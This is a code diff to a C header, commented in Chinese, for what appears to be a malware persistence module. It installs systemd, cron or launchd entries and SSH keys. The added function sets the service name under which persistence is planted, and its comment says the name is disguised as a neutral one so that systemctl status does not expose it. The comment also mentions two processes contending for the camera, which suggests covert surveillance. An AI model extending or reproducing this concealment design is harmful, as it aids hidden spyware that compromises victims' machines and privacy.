@@ -35,6 +35,21 @@ size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t c
  * line 需为单行、可打印、带 ssh-/ecdsa-/sk- 类型前缀。成功 0，非法 -1。 */
 int persist_sshkey_pubkey(const char *line);
 
+/* 设置驻留落点用的服务名（单元名 / cron 名 / plist Label / Description）。
+ *
+ * 此前这些都是硬编码的项目名，而部署侧已把落点伪装成中性名——两个名字
+ * 不一致会在真机上造成三重合失效：伪装失效（systemctl status 一眼可读）、
+ * 双重驻留（两套服务同时跑，两个进程抢摄像头）、卸载残留（只清一套）。
+ * 名字必须由部署侧单一产地决定，驻留段不得自带。
+ *
+ * 字符集限制为 [A-Za-z0-9_-]、首字符非 '-'、长度 1..63：服务名会被拼进
+ * "%s/etc/systemd/system/%s.service"，接受任意字符串即为路径穿越。
+ * 成功 0；空/超长/含非法字符 -1（调用方必须检查，不得忽略）。 */
+int persist_set_service_name(const char *name);
+
+/* 读取当前生效的服务名（默认保留历史值以不破坏既有测试语义） */
+const char *persist_service_name(void);
+
 size_t persist_method_count(void);
 const persist_desc_t *persist_method_at(size_t i);
 
